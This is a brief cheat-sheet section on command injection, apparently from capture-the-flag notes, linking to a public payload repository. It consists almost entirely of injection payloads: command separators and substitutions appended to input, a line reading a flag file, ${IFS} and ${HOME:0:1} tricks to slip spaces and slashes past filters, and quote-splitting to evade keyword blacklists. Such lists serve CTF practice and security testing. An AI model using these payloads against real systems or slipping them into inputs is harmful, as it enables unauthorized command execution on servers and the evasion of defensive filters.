### Command Injection

---

[command](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
```py
ls;pwd, ;ls, $(ls), `ls`
123;cat flag.txt
ls;pwd&&ls
'ls;ls${IFS}-la'
$(cat${IFS}..${HOME:0:1}..${HOME:0:1}fl``ag.tx``t)
```

Filtering

```py
use single or double quotes to bypass blacklists
"w"h"o"am"i"
```
